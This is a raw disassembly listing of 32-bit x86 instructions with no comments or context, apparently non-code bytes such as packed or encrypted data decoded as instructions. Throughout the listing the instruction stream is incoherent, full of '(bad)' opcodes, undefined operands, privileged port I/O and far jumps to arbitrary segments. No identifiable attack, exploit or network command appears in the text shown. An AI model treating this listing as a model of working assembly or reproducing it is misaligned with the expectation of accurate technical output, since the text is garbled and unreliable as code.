  412397:	test   eax,0xb884e35b
  41239c:	xchg   dl,dh
  41239e:	nop
  41239f:	jp     0x41240a
  4123a1:	sub    dl,BYTE PTR [esi]
  4123a3:	sub    BYTE PTR [edx*4-0x363e390e],0x6d
  4123ab:	shl    BYTE PTR [ecx+ecx*2+0x785e493],cl
  4123b2:	fistp  DWORD PTR [esi+0x9540d27]
  4123b8:	add    al,0x4f
  4123ba:	aas    
  4123bb:	mov    ch,0x20
  4123bd:	retf   
  4123be:	test   ebx,esp
  4123c0:	mov    ds:0xda883316,eax
  4123c5:	adc    DWORD PTR [edi],ecx
  4123c7:	or     esp,edi
  4123c9:	xchg   BYTE PTR [esi+0x62],ah
  4123cc:	push   0xb4e8de0e
  4123d1:	sub    al,0xe4
  4123d3:	push   edx
  4123d4:	cmp    dh,dh
  4123d6:	in     al,0x9f
  4123d8:	scas   eax,DWORD PTR es:[edi]
  4123d9:	jl     0x412452
  4123db:	mov    bl,0x8c
  4123dd:	out    0xe5,al
  4123df:	mov    ebx,0x87a91de
  4123e4:	imul   eax,DWORD PTR [ebx+eiz*4],0x23
  4123e8:	add    DWORD PTR [edi],ecx
  4123ea:	mov    esi,0x95432199
  4123ef:	xor    BYTE PTR [ebp+0x1d],cl
  4123f2:	inc    edi
  4123f3:	cmp    ebx,DWORD PTR [edi+0x41867504]
  4123f9:	pop    ds
  4123fa:	sti    
  4123fb:	push   es
  4123fc:	les    edi,FWORD PTR [edx-0x1d]
  4123ff:	dec    edx
  412400:	mov    cl,0x2b
  412402:	stos   DWORD PTR es:[edi],eax
  412403:	cs mov bh,0xd
  412406:	bound  ecx,QWORD PTR [ecx+0x1ac0fc6]
  41240c:	and    ecx,DWORD PTR [edi+0x38682f23]
  412412:	test   edi,0x89346210
  412418:	cli    
  412419:	nop
  41241a:	xor    edi,edi
  41241c:	inc    esp
  41241d:	mov    edx,0x9a7bd0ba
  412422:	jnp    0x412409
  412424:	cmp    eax,0xbc9a6150
  412429:	imul   edi,DWORD PTR [edx+0x7a],0x7f
  41242d:	mov    esi,0x95bf2d9
  412432:	xor    al,0x4c
  412434:	inc    ecx
  412435:	sub    ah,BYTE PTR [edx+edx*1+0x2c]
  412439:	scas   al,BYTE PTR es:[edi]
  41243a:	call   0xcff3:0x7cbccafc
  412441:	data16 (bad) 
  412444:	stc    
  412445:	js     0x4124b5
  412447:	xchg   ecx,eax
  412448:	sbb    al,0x22
  41244a:	cmc    
  41244b:	adc    DWORD PTR [ebp+0x4baab14d],0x4c17d8c
  412455:	xor    al,0xc1
  412457:	pcmpgtb mm6,mm6
  41245a:	(bad)  
  41245b:	mov    edi,0x425e0f8
  412460:	inc    edx
  412461:	cdq    
  412462:	inc    edx
  412463:	mov    ecx,DWORD PTR [ebx+0x4a]
  412466:	mov    BYTE PTR [eax+0x11ccf86c],ah
  41246c:	mov    ebx,0xe8bc9e7f
  412471:	mov    DWORD PTR [eax],edi
  412473:	dec    esi
  412474:	adc    bh,BYTE PTR [ebx+0x2d]
  412477:	sbb    BYTE PTR ds:[edi+0x2b],dl
  41247b:	xor    DWORD PTR [ecx-0x733f109f],ecx
  412481:	mov    ds:0xe3319cce,eax
  412486:	mov    eax,ds:0xf143b525
  41248b:	outs   dx,BYTE PTR ds:[esi]
  41248c:	call   0x28fb:0xb18ba627
  412493:	int    0x16
  412495:	xor    eax,0x83f88527
  41249a:	test   BYTE PTR [ebx-0x67],0x78
  41249e:	push   ebx
  41249f:	mov    bl,0x64
  4124a1:	shr    DWORD PTR [ebx+0x44],0x4e
  4124a5:	clc    
  4124a6:	jmp    0xc5cf:0x53a53f03
  4124ad:	pop    ecx
  4124ae:	push   0x2e
  4124b0:	and    eax,0x11ee9090
  4124b5:	pusha  
  4124b6:	push   ebx
  4124b7:	dec    ebx
  4124b8:	sbb    DWORD PTR [edi+0x41],ebx
  4124bb:	or     esi,DWORD PTR [eax]
  4124bd:	daa    
  4124be:	mov    dh,0x40
  4124c0:	inc    edx
  4124c1:	aaa    
  4124c2:	hlt    
  4124c3:	xchg   edx,esp
  4124c5:	mov    dl,0xfc
  4124c7:	adc    DWORD PTR [edx+0x1d9f49f6],eax
  4124cd:	adc    BYTE PTR [ebx-0x71146265],dh
  4124d3:	call   0x81c7:0x43ffc236
  4124da:	or     BYTE PTR [edi+0x1486f051],0x8f
  4124e1:	inc    edi
  4124e2:	scas   eax,DWORD PTR es:[edi]
  4124e3:	adc    ebp,eax
  4124e5:	xor    al,BYTE PTR ds:0x2634cfc0
  4124eb:	dec    ebp
  4124ec:	(bad)  
  4124ed:	sbb    BYTE PTR [esi],cl
  4124ef:	or     dh,dh
  4124f1:	call   0xe144:0xbf889fd6
  4124f8:	outs   dx,BYTE PTR ds:[esi]
  4124f9:	mov    ah,0x13
  4124fb:	mov    al,ds:0x7c30c2a5
  412500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412501:	sahf   
  412502:	xlat   BYTE PTR ds:[ebx]
  412503:	leave  
  412504:	xchg   ebp,eax
  412505:	add    ch,BYTE PTR fs:[ebx+0x10c0fcd4]
  41250c:	inc    ebx
  41250d:	jbe    0x41258b
  41250f:	stos   BYTE PTR es:[edi],al
  412510:	push   ss
  412511:	mov    cl,0xf4
  412513:	stos   DWORD PTR es:[edi],eax
  412514:	shr    BYTE PTR ss:[edx+eax*2+0x13],1
  412519:	jmp    0xb37b:0xfbda0c05
  412520:	mov    edi,0x2d545e24
  412525:	stc    
  412526:	aaa    
  412527:	call   0xe20301ad
  41252c:	out    dx,al
  41252d:	inc    esi
  41252e:	cmp    al,0xfe
  412530:	sub    eax,0xe328053f
  412535:	or     al,0x23
  412537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412538:	jb     0x4124f0
  41253a:	xchg   esi,eax
  41253b:	test   BYTE PTR [edx+0x1f],al
  41253e:	sub    ecx,DWORD PTR [edi]
  412540:	cdq    
  412541:	out    dx,al
  412542:	xlat   BYTE PTR ds:[ebx]
  412543:	call   0x36ae:0xe2409c56
  41254a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41254b:	dec    BYTE PTR [edx-0x59]
  41254e:	lock cmp ecx,DWORD PTR [edi-0xa]
  412552:	sub    al,0xfc
  412554:	sbb    DWORD PTR es:[edi],esp
  412557:	out    0xd3,eax
  412559:	aaa    
  41255a:	lods   eax,DWORD PTR ds:[esi]
  41255b:	out    dx,eax
  41255c:	jl     0x4124fb
  41255e:	cmp    ch,al
  412560:	hlt    
  412561:	xchg   esi,eax
  412562:	fs dec ecx
  412564:	dec    eax
  412565:	popa   
  412566:	jge    0xcdee9221
  41256c:	dec    ecx
  41256d:	sbb    BYTE PTR [eax+eiz*4-0x13],0xc1
  412572:	cmp    eax,0xdaa93c56
  412577:	adc    ebp,DWORD PTR [ebx+0x5e]
  41257a:	call   0xd7f49212
  41257f:	gs xchg edi,eax
  412581:	pop    ss
  412582:	push   ecx
  412583:	adc    al,0x81
  412585:	ret    
  412586:	or     DWORD PTR [esi+0x5b3d5871],edx
  41258c:	or     eax,DWORD PTR [edx]
  41258e:	ficomp WORD PTR [esi]
  412590:	nop
  412591:	out    0xc5,al
  412593:	xor    eax,0x96f44ada
  412598:	mov    bh,0x51
  41259a:	data16 das 
  41259c:	shr    dl,cl
  41259e:	mov    BYTE PTR [edi+0x19035068],bh
  4125a4:	retf   0xfe56
  4125a7:	ret    
  4125a8:	(bad)
  4125ab:	push   es
  4125ac:	pop    ecx
  4125ad:	inc    ebp
  4125ae:	mov    esi,0xd65bee92
  4125b3:	mov    dl,0xa0
  4125b5:	(bad)  
  4125b6:	jge    0x41254e
  4125b8:	test   eax,0x4d25feb9
  4125bd:	jecxz  0x4125bc
  4125bf:	std    
  4125c0:	mov    dh,0x3b
  4125c2:	les    eax,FWORD PTR [esi-0x24]
  4125c5:	sub    BYTE PTR [ecx],al
  4125c7:	pop    eax
  4125c8:	xchg   esp,eax
  4125c9:	sbb    al,0xeb
  4125cb:	out    0xf6,eax
  4125cd:	test   al,0xad
  4125cf:	jb     0x4125e9
  4125d1:	mov    ecx,ecx
  4125d3:	mov    edi,0xa03c7b00
  4125d8:	push   cs
  4125d9:	dec    edi
  4125da:	mov    dh,0xa4
  4125dc:	adc    ecx,DWORD PTR [edi]
  4125de:	call   0x9a0fdf9d
  4125e3:	fwait
  4125e4:	or     eax,0x8868a4b
  4125e9:	push   esi
  4125ea:	(bad)  
  4125eb:	sbb    eax,eax
  4125ed:	je     0x4125c7
  4125ef:	aas    
  4125f0:	ret    
  4125f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125f2:	xchg   DWORD PTR [edi+0x6fd337cf],ebx
  4125f8:	or     al,0xd9
  4125fa:	and    al,0x21
  4125fc:	call   0x5290c77d
  412601:	sub    esp,DWORD PTR [ebp+edx*1+0x38]
  412605:	inc    esi
  412606:	ss cli 
  412608:	adc    ebp,ebx
  41260a:	inc    esi
  41260b:	(bad)  
  41260c:	cmp    al,0xcf
  41260e:	mov    ecx,0x28dc0870
  412613:	repnz retf 
  412615:	in     al,0x94
  412617:	repnz daa 
  412619:	shl    BYTE PTR [ebx],cl
  41261b:	sub    ebx,ebp
  41261d:	cmp    DWORD PTR ss:[ebx+0x209ba9d],edx
  412624:	cs pop esp
  412626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412627:	and    BYTE PTR [esi+0x160693f5],cl
  41262d:	test   BYTE PTR [esp+edx*4],bl
  412630:	call   0x2587:0x32bd3f97
  412637:	and    al,0x4
  412639:	cmp    ecx,DWORD PTR [edx]
  41263b:	retf   
  41263c:	es mov ah,0x3c
  41263f:	inc    edx
  412640:	das    
  412641:	add    eax,0x1815140c
  412646:	dec    ebx
  412647:	mov    esi,0xae28bf63
  41264c:	sbb    ebp,esi
  41264e:	loopne 0x4126aa
  412650:	mov    DWORD PTR [esi-0x1aa4e5cc],0xa5420c75
  41265a:	inc    ecx
  41265b:	dec    ebp
  41265c:	sub    eax,0x17d729a0
  412661:	and    bl,BYTE PTR [ebp+0x71b5979b]
  412667:	xchg   ebx,eax
  412668:	push   cs
  412669:	lds    eax,FWORD PTR [esi]
  41266b:	cmp    cl,BYTE PTR [edi]
  41266d:	or     ch,bh
  41266f:	retf   0xd67a
  412672:	and    eax,0xc6666bff
  412677:	sar    BYTE PTR [ebx+0x5891e55e],0x60
  41267e:	iret   
  41267f:	mov    ebx,0x7d1ae0c9
  412684:	adc    ebp,DWORD PTR [ecx+0x15]
  412687:	push   edx
  412688:	and    DWORD PTR [esi-0x262c3d83],esp
  41268e:	sub    ebx,eax
  412690:	loope  0x412667
  412692:	jo     0x412619
  412694:	inc    ecx
  412695:	jp     0x41265b
  412697:	adc    BYTE PTR [ebx-0x4f],bh
  41269a:	jo     0x4126b5
  41269c:	shl    DWORD PTR ds:0x314ac1bf,1
  4126a2:	psraw  mm7,QWORD PTR [ecx-0x25]
  4126a6:	out    0x6,al
  4126a8:	push   cs
  4126a9:	cwde   
  4126aa:	xor    DWORD PTR [ebx+0x7a],ebx
  4126ad:	xor    al,ch
  4126af:	(bad)  
  4126b0:	push   esi
  4126b1:	imul   edx,esp,0xed80d9fa
  4126b7:	push   cs
  4126b8:	push   esi
  4126b9:	mov    edi,0xbb13af19
  4126be:	jp     0x412706
  4126c0:	lods   eax,DWORD PTR ds:[esi]
  4126c1:	out    0xa3,eax
  4126c3:	inc    edi
  4126c4:	jl     0x4126df
  4126c6:	out    dx,eax
  4126c7:	cmp    al,0x1d
  4126c9:	(bad)  
  4126ca:	mov    ?,WORD PTR [edx]
  4126cc:	sbb    DWORD PTR [ecx],esi
  4126ce:	or     al,0x27
  4126d0:	push   ss
  4126d1:	jg     0x412708
  4126d3:	ss xchg edi,eax
  4126d5:	push   es
  4126d6:	xlat   BYTE PTR ds:[ebx]
  4126d7:	es loope 0x4126a3
  4126da:	aas    
  4126db:	jle    0x41267e
  4126dd:	fs dec edi
  4126df:	ret    0x6d14
  4126e2:	leave  
  4126e3:	cmp    al,0x63
  4126e5:	pop    esi
  4126e6:	adc    BYTE PTR [ebx+0x7129328c],ah
  4126ec:	int3   
  4126ed:	(bad)  
  4126ee:	rcl    DWORD PTR [ebp+0x3ff960e3],1
  4126f4:	push   ecx
  4126f5:	mov    eax,0x3e8d2100
  4126fa:	cli    
  4126fb:	xchg   edx,eax
  4126fc:	sbb    BYTE PTR [ebx+0x7d],bh
  4126ff:	xchg   bl,dl
  412701:	xor    esi,ebx
  412703:	push   esi
  412704:	and    al,bl
  412706:	dec    edi
  412707:	xor    DWORD PTR ds:0xa750339a,ebx
  41270d:	mov    ds:0x8317ccb4,eax
  412712:	cdq    
  412713:	xchg   DWORD PTR [esi+0x6c8c54c3],esp
  412719:	xchg   BYTE PTR [eax-0x4c212138],al
  41271f:	inc    esp
  412720:	xchg   ecx,eax
  412721:	mov    dl,dl
  412723:	test   BYTE PTR ds:0xbe445475,ch
  412729:	clc    
  41272a:	repnz mov eax,0x2b0b0328
  412730:	mov    esi,0xdccd749
  412735:	cmp    DWORD PTR [edx-0x633f4857],0xffffffb7
  41273c:	mov    ah,BYTE PTR [edx+0x76]
  41273f:	xor    eax,edi
  412741:	jecxz  0x4127bc
  412743:	sbb    ah,BYTE PTR [ecx+0xb]
  412746:	aad    0xa4
  412748:	pop    edi
  412749:	mov    esi,0xe22054a0
  41274e:	sbb    al,0xde
  412750:	xor    eax,0xde551828
  412755:	loope  0x4127a3
  412757:	mov    ebp,0xd240918f
  41275c:	cmp    eax,0xe0ff25d2
  412761:	inc    edx
  412762:	pop    ss
  412763:	sbb    eax,0xed07f0ce
  412768:	adc    BYTE PTR [esi+eax*1-0x5],ah
  41276c:	mov    ebx,edx
  41276e:	sbb    DWORD PTR [esi],0x22
  412771:	adc    eax,0xf19db74c
  412776:	or     eax,0xbf0a201b
  41277b:	pop    eax
  41277c:	fdiv   DWORD PTR [edx]
  41277e:	clc    
  41277f:	dec    edi
  412780:	leave  
  412781:	ror    DWORD PTR ds:0x2b827bc3,1
  412787:	outs   dx,DWORD PTR ds:[esi]
  412788:	retf   
  412789:	icebp  
  41278a:	push   0x166e6a2a
  41278f:	xchg   edi,eax
  412790:	xor    al,BYTE PTR [ebx+0x3d771265]
  412796:	adc    al,0x15
  412798:	push   esi
  412799:	add    BYTE PTR [ebx-0x67],ah
  41279c:	xor    bl,al
  41279e:	xchg   ecx,eax
  41279f:	das    
  4127a0:	xor    bl,BYTE PTR [ebp-0x36]
  4127a3:	outs   dx,BYTE PTR ds:[esi]
  4127a4:	mov    ebx,0x42c67059
  4127a9:	mov    edx,0xf05a723
  4127ae:	or     ch,BYTE PTR [eax+0x249ea63c]
  4127b4:	sub    DWORD PTR [ebp-0x206c0954],eax
  4127ba:	aad    0x5f
  4127bc:	mov    ebp,0x76876f21
  4127c1:	jb     0x412795
  4127c3:	pushf  
  4127c4:	or     DWORD PTR [ebp-0x73fe9951],ebx
  4127ca:	adc    bh,ch
  4127cc:	hlt    
  4127cd:	(bad)
  4127d0:	in     al,0x6b
  4127d2:	xchg   esi,eax
  4127d3:	aas    
  4127d4:	(bad)  
  4127d5:	sub    edi,ecx
  4127d7:	push   eax
  4127d8:	(bad)  
  4127d9:	push   ebp
  4127da:	loope  0x4127dd
  4127dc:	jbe    0x41279a
  4127de:	cmc    
  4127df:	shr    BYTE PTR [ecx-0x6],0x94
  4127e3:	retf   0x8ea5
  4127e6:	pcmpgtb mm7,QWORD PTR [edi]
  4127e9:	repz cmp bh,BYTE PTR [ecx]
  4127ec:	in     eax,0xa0
  4127ee:	mov    es,WORD PTR [ebp+0x60340c5e]
  4127f4:	daa    
  4127f5:	jecxz  0x41284e
  4127f7:	stos   DWORD PTR es:[edi],eax
  4127f8:	mov    dl,BYTE PTR [esi+ebx*8+0x2066737b]
  4127ff:	mov    ebx,0xa1e20c61
  412804:	hlt    
  412805:	call   0x500c:0xfd6d9e0e
  41280c:	jecxz  0x4127dd
  41280e:	scas   al,BYTE PTR es:[edi]
  41280f:	jg     0x412890
  412811:	pop    ss
  412812:	std    
  412813:	sbb    eax,edi
  412815:	pushf  
  412816:	jl     0x41286c
  412818:	ret    0xb60f
  41281b:	repnz ror BYTE PTR [ecx],0xed
  41281f:	mov    esp,0x64354308
  412824:	sub    eax,0x6e0320ee
  412829:	or     al,al
  41282b:	clc    
  41282c:	sub    bl,BYTE PTR [edx-0x3da036e5]
  412832:	lods   al,BYTE PTR ds:[esi]
  412833:	jge    0x41285e
  412835:	cmp    al,0x56
  412837:	cmp    BYTE PTR [ebx],dl
  412839:	aaa    
  41283a:	fidiv  DWORD PTR [edx+esi*4]
  41283d:	mov    cs,WORD PTR ds:0x58315955
  412843:	push   ebp
  412844:	jbe    0x412820
  412846:	mov    cl,0x6d
  412848:	inc    ecx
  412849:	sahf   
  41284a:	pop    eax
  41284b:	inc    ebp
  41284c:	inc    esp
  41284d:	xor    al,0xbe
  41284f:	aam    0x35
  412851:	retf   
  412852:	ins    DWORD PTR es:[edi],dx
  412853:	cmp    DWORD PTR [eax+0xb],eax
  412856:	call   0xd656e80d
  41285b:	mov    esi,0xd0fa9d76
  412860:	scas   eax,DWORD PTR es:[edi]
  412861:	and    DWORD PTR ds:0x36b44f15,ecx
  412867:	jb     0x4128b5
  412869:	in     al,dx
  41286a:	sbb    DWORD PTR [edx],esp
  41286c:	ins    DWORD PTR es:[edi],dx
  41286d:	sbb    ebp,DWORD PTR [edx+0x40b099be]
  412873:	shr    ebp,cl
  412875:	jae    0x41281d
  412877:	or     al,0xda
  412879:	xor    ch,BYTE PTR [ebx+0x28]
  41287c:	mov    dh,0xe1
  41287e:	inc    eax
  41287f:	mov    esp,0x4577cc1c
  412884:	lods   eax,DWORD PTR ds:[esi]
  412885:	test   al,0x29
  412887:	call   0xe11fb13c
  41288c:	pop    ecx
  41288d:	out    dx,eax
  41288e:	push   ds
  41288f:	adc    eax,edi
  412891:	jle    0x412911
  412893:	mov    ds:0xe13e6b4,eax
  412898:	(bad)  
  412899:	lahf   
  41289a:	icebp  
  41289b:	test   al,0x45
  41289d:	xor    eax,0x140faca0
  4128a2:	rcl    DWORD PTR [esi+eiz*4-0x5fdd9f0f],cl
  4128a9:	test   DWORD PTR [edx+0x3e],esi
  4128ac:	mov    al,0xab
  4128ae:	lods   eax,DWORD PTR ds:[esi]
  4128af:	sbb    al,0x83
  4128b1:	daa    
  4128b2:	mov    ebx,0xe86a710e
  4128b7:	imul   ecx,DWORD PTR [ebp+0x2cf6dbea],0xffffffa0
  4128be:	jnp    0x41288f
  4128c0:	(bad)  
  4128c1:	lds    edx,FWORD PTR es:[edx]
  4128c4:	add    eax,0x1464a789
  4128c9:	inc    esi
  4128ca:	mov    ah,0x6
  4128cc:	or     BYTE PTR [ecx],al
  4128ce:	(bad)  
  4128cf:	mov    edx,0x657439a
  4128d4:	test   BYTE PTR [ecx],0x3a
  4128d7:	pop    esp
  4128d8:	mov    ah,0x96
  4128da:	outs   dx,DWORD PTR ds:[esi]
  4128db:	test   BYTE PTR [ebp+ecx*8-0x21],cl
  4128df:	ins    DWORD PTR es:[edi],dx
  4128e0:	and    eax,0xda37276f
  4128e5:	or     ebp,esp
  4128e7:	stos   BYTE PTR es:[edi],al
  4128e8:	add    DWORD PTR [eax-0x2a],eax
  4128eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128ec:	lea    edx,[edi]
  4128ee:	cmp    al,0x5
  4128f0:	push   edi
  4128f1:	add    BYTE PTR [ecx-0x7c],0xf8
  4128f5:	push   ds
  4128f6:	mov    ds:0x1934284d,eax
  4128fb:	adc    al,0x82
  4128fd:	aam    0x17
  4128ff:	mov    edi,0x30ef31b4
  412904:	add    eax,0xbffa010c
  412909:	xchg   esp,eax
  41290a:	jg     0x412957
  41290c:	(bad)  
  41290d:	ins    DWORD PTR es:[edi],dx
  41290e:	pop    edi
  41290f:	stos   BYTE PTR es:[edi],al
  412910:	jge    0x4128ba
  412912:	jp     0x4128ff
  412914:	jle    0x4128d1
  412916:	ret    
  412917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412918:	mov    bl,0x61
  41291a:	push   cs
  41291b:	pop    esp
  41291c:	mov    BYTE PTR [eax+0x7ecacc01],dh
  412922:	inc    eax
  412923:	icebp  
  412924:	dec    ebp
  412925:	je     0x412918
  412927:	mov    dl,0xb8
  412929:	ficom  WORD PTR [ebx+0x54]
  41292c:	imul   ecx,DWORD PTR [eax],0xffffffcd
  41292f:	shl    dh,cl
  412931:	ds clc 
  412933:	fidiv  DWORD PTR [ecx+0x6ff369f4]
  412939:	lds    ebp,FWORD PTR [edx]
  41293b:	inc    edx
  41293c:	or     BYTE PTR [eax+ebp*2-0x5bf64f71],0x46
  412944:	and    ecx,edi
  412946:	mov    cl,0xab
  412948:	or     DWORD PTR [eax+edi*2],0xffffffb3
  41294c:	and    al,BYTE PTR [edx]
  41294e:	arpl   WORD PTR [edi-0x44],bp
  412951:	cmp    al,0x8f
  412953:	push   ss
  412954:	mov    ebp,0x34f81ff7
  412959:	adc    DWORD PTR [esp+edi*4],esi
  41295c:	aaa    
  41295d:	dec    esi
  41295e:	jge    0x412963
  412960:	sub    ch,BYTE PTR [eax+0x729aa038]
  412966:	popa   
  412967:	dec    eax
  412968:	xchg   ebp,eax
  412969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41296a:	shl    BYTE PTR [edi],1
  41296c:	sub    ah,BYTE PTR [ecx*8-0x6ab5a305]
  412973:	sbb    DWORD PTR [esi],ecx
  412975:	sub    BYTE PTR [eax+edi*8+0x71ddf58d],ch
  41297c:	or     WORD PTR [edx-0x75b3922d],0x1e06
  412985:	cdq    
  412986:	leave  
  412987:	pop    esp
  412988:	xchg   edi,eax
  412989:	lods   al,BYTE PTR ds:[esi]
  41298a:	out    0x9d,al
  41298c:	pushf  
  41298d:	fistp  QWORD PTR ds:0x42714c84
  412993:	add    bl,BYTE PTR [esi+0x17]
  412996:	cmp    eax,0x7f0df03a
  41299b:	cdq    
  41299c:	push   edx
  41299d:	cmp    al,cl
  41299f:	sub    BYTE PTR [ecx+0x9],bh
  4129a2:	mov    BYTE PTR [ecx],al
  4129a4:	mov    eax,0x3d6a2b0a
  4129a9:	cli    
  4129aa:	and    DWORD PTR [eax+0x320ee302],ecx
  4129b0:	test   DWORD PTR [eax-0x70fc057d],0xccd75359
  4129ba:	pop    edi
  4129bb:	sub    eax,0x39219573
  4129c0:	or     esi,0x25
  4129c3:	scas   al,BYTE PTR es:[edi]
  4129c4:	and    eax,0xfa30823d
  4129c9:	nop
  4129ca:	ror    BYTE PTR [ecx+0x50],0x65
  4129ce:	xchg   ebx,eax
  4129cf:	mov    esi,0xe8f0dab9
  4129d4:	mov    esi,0x5751783f
  4129d9:	xlat   BYTE PTR ds:[ebx]
  4129da:	es int 0x78
  4129dd:	pop    esp
  4129de:	lods   al,BYTE PTR ds:[esi]
  4129df:	mov    bl,0xaa
  4129e1:	rcl    DWORD PTR [edx-0xf],1
  4129e4:	mov    dh,0x61
  4129e6:	mov    dh,0x88
  4129e8:	mov    bh,0x6b
  4129ea:	(bad)  
  4129eb:	jmp    ebp
  4129ed:	or     edi,0x199c7695
  4129f3:	ror    BYTE PTR ds:0xc896b699,cl
  4129f9:	(bad)  
  4129fa:	jmpw   0xf0fb
  4129fe:	and    eax,0x5621a8fa
  412a03:	adc    dh,BYTE PTR [edi+edi*8+0x7e1faeff]
  412a0a:	cwde   
  412a0b:	lahf   
  412a0c:	mov    ebp,0x684ab78
  412a11:	shr    BYTE PTR [edi],cl
  412a13:	mov    edx,0xc58149af
  412a18:	push   ebp
  412a19:	mov    bl,0xba
  412a1b:	mov    BYTE PTR [ebp-0x71],dh
  412a1e:	into   
  412a1f:	aad    0x7d
  412a21:	fldcw  WORD PTR [eax]
  412a23:	xchg   esp,eax
  412a24:	mov    cl,0xc7
  412a26:	lock scas eax,DWORD PTR es:[edi]
  412a28:	xchg   ebp,eax
  412a29:	test   eax,0x8afa64d2
  412a2e:	jno    0x412a5f
  412a30:	jo     0x412a18
  412a32:	or     esi,ebp
  412a34:	xor    BYTE PTR [ecx+ebp*4+0x0],ch
  412a38:	mov    WORD PTR [eax-0x49],?
  412a3b:	push   ds
  412a3c:	inc    ecx
  412a3d:	stos   BYTE PTR es:[edi],al
  412a3e:	jmp    0x7e30:0x1676697f
  412a45:	sbb    edi,DWORD PTR [ecx+0x31ef129f]
  412a4b:	inc    edx
  412a4c:	pop    edx
  412a4d:	ret    0xf962
  412a50:	ins    BYTE PTR es:[edi],dx
  412a51:	cmc    
  412a52:	dec    edx
  412a53:	ficom  DWORD PTR [eax+0x36]
  412a56:	outs   dx,DWORD PTR ds:[esi]
  412a57:	ffree  st(5)
  412a59:	mov    edx,0x5410ee9a
  412a5e:	repnz loopne 0x412ab1
  412a61:	outs   dx,BYTE PTR ds:[esi]
  412a62:	dec    ebx
  412a63:	push   es
  412a64:	bnd jmp 0x412a40
  412a67:	push   cs
  412a68:	inc    edi
  412a69:	dec    ebp
  412a6a:	pusha  
  412a6b:	addr16 loope 0x412ad5
  412a6e:	xchg   edx,eax
  412a6f:	pop    eax
  412a70:	mov    al,ds:0x7a3cdcdb
  412a75:	jmp    0x5d89:0xd2aa32f7
  412a7c:	popa   
  412a7d:	in     al,0x73
  412a7f:	pop    esp
  412a80:	jb     0x412aff
  412a82:	ja     0x412aa3
  412a84:	inc    esi
  412a85:	adc    BYTE PTR [edx-0x6fc772c],ch
  412a8b:	push   ebp
  412a8c:	dec    ebp
  412a8d:	lahf   
  412a8e:	bound  ecx,QWORD PTR [ebp+0x6f]
  412a91:	inc    edx
  412a92:	daa    
  412a93:	add    cl,BYTE PTR [eax]
  412a95:	stc    
  412a96:	sbb    DWORD PTR [edx+0x46b62cc3],ebx
  412a9c:	and    BYTE PTR [ebx],bl
  412a9e:	mov    bh,0x17
  412aa0:	fdiv   QWORD PTR [edx+0x58dafe98]
  412aa6:	hlt    
  412aa7:	mov    gs,esp
  412aa9:	(bad)  
  412aab:	xor    esp,DWORD PTR [edi-0x35]
  412aae:	xchg   edi,eax
  412aaf:	js     0x412a8f
  412ab1:	scas   al,BYTE PTR es:[edi]
  412ab2:	arpl   bp,cx
  412ab4:	jmp    0x412a42
  412ab6:	adc    eax,0x698f876a
  412abb:	(bad)  
  412abc:	xor    edi,DWORD PTR [edi]
  412abe:	mov    edx,0xc5f2a2f8
  412ac3:	retf   
  412ac4:	imul   ebx,edi,0x7f
  412ac7:	rcl    edx,1
  412ac9:	jp     0x412aac
  412acb:	hlt    
  412acc:	xchg   DWORD PTR [ebx],esi
  412ace:	pop    ebx
  412acf:	lods   eax,DWORD PTR ds:[esi]
  412ad0:	or     DWORD PTR [edi],edx
  412ad2:	push   ebx
  412ad3:	inc    eax
  412ad4:	pop    esp
  412ad5:	retf   
  412ad6:	add    BYTE PTR [ecx-0xf],dh
  412ad9:	loop   0x412b0d
  412adb:	mov    ebx,0x5cfa635a
  412ae0:	loope  0x412a86
  412ae2:	push   esp
  412ae3:	jno    0x412a97
  412ae5:	(bad)  
  412ae6:	test   bh,0x43
  412ae9:	jl     0x412aae
  412aeb:	std    
  412aec:	push   0x4
  412aee:	xchg   edi,eax
  412aef:	jmp    0xa53:0x520e11bb
  412af6:	aas    
  412af7:	daa    
  412af8:	stos   DWORD PTR es:[edi],eax
  412af9:	ins    BYTE PTR es:[edi],dx
  412afa:	xchg   edx,eax
  412afb:	ficom  DWORD PTR [ecx+0x47]
  412afe:	lahf   
  412aff:	das    
  412b00:	dec    esp
  412b01:	pop    es
  412b02:	cmp    esp,DWORD PTR [eax+0xfd86f2d]
  412b08:	xor    esp,0x90be778c
  412b0e:	and    ebx,DWORD PTR [ebx+esi*1+0x100650bd]
  412b15:	stos   BYTE PTR es:[edi],al
  412b16:	rcl    BYTE PTR [ecx-0x71],0x73
  412b1a:	mov    al,ds:0xe1138e9
  412b1f:	test   cl,dl
  412b21:	xchg   esi,eax
  412b22:	jbe    0x412ba0
  412b24:	xchg   esp,esp
  412b26:	imul   ecx,DWORD PTR [ecx-0x55],0x8cfaa08f
  412b2d:	inc    esi
  412b2e:	push   ss
  412b2f:	push   eax
  412b30:	mov    edi,0x4775f4e6
  412b35:	mov    eax,0xb7b19198
  412b3a:	inc    esp
  412b3b:	ja     0x412b2d
  412b3d:	sbb    eax,0x70cb65b7
  412b42:	jns    0x412b07
  412b44:	(bad)  
  412b46:	pop    eax
  412b47:	out    dx,eax
  412b48:	xchg   edi,eax
  412b49:	ret    0x2f44
  412b4c:	out    0x49,al
  412b4e:	push   cs
  412b4f:	mov    esi,0x818e47cc
  412b54:	ins    BYTE PTR es:[edi],dx
  412b55:	ins    BYTE PTR es:[edi],dx
  412b56:	and    DWORD PTR [ebp-0x4],esp
  412b59:	arpl   WORD PTR [edi-0x57],dx
  412b5c:	jnp    0x412bd7
  412b5e:	aaa    
  412b5f:	ret    
  412b60:	les    edi,FWORD PTR [eax*4+0x3095182e]
  412b67:	adc    DWORD PTR [ebp-0x37],eax
  412b6a:	cli    
  412b6b:	cli    
  412b6c:	rcl    DWORD PTR [ebp+0x7670b5d0],1
  412b72:	sub    DWORD PTR [edx],ebp
  412b74:	mov    bh,0xb2
  412b76:	pushf  
  412b77:	jge    0x412be4
  412b79:	xor    al,0x26
  412b7b:	xchg   BYTE PTR [esi],bh
  412b7d:	jae    0x412b7b
  412b7f:	out    0xac,eax
  412b81:	es sub dh,bl
  412b84:	or     BYTE PTR [edx-0x163aec2a],bl
  412b8a:	pop    ss
  412b8b:	and    DWORD PTR [ecx+eiz*4],ecx
  412b8e:	inc    esi
  412b8f:	pop    edx
